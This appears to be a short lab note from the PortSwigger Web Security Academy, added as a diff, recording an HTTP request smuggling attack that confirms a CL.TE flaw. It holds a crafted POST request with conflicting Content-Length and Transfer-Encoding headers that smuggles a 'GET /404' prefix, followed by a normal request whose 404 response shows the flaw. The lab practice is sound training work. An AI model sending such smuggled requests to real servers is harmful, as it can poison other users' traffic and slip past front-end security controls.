@@ -1,0 +1,34 @@
+// Attack request
+
+POST / HTTP/1.1
+Host: ac131f121f00bc4680674032006f000d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 45
+Transfer-Encoding: chunked
+
+b
+q=smuggling
+0
+
+GET /404 HTTP/1.1
+Foo:x
+
+// Normal request
+
+GET / HTTP/1.1
+Host: ac131f121f00bc4680674032006f000d.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+// Received an 404 error -> CL.TE Smuggle exists
